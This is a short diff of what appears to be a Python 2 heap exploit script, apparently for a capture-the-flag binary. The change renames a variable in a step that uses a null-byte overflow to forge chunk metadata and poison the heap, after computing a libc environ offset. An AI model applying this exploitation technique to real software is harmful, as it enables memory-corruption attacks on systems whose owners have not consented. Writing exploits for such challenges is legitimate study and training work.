@@ -59,9 +59,9 @@ environ = base_libc + 0x3c6f38
 
 add(0, 0x58, "")
 add(1, 0xf8, "")
-size = heap - pie
-print "[+] size (heap - size): 0x%x" % size
-update(0, p64(0)*4 + p64(0x100) + p64(size) + p64(pie)*2 + p64(0)*2 + p64(size) + "\x00") # null byte overflow size next chunk
+prev_size = heap - pie
+print "[+] prev_size (heap - pie): 0x%x" % prev_size
+update(0, p64(0)*4 + p64(0x100) + p64(prev_size) + p64(pie)*2 + p64(0)*2 + p64(prev_size) + "\x00") # null byte overflow size next chunk
 delete(1)
 add(3, 0x400, "")
 
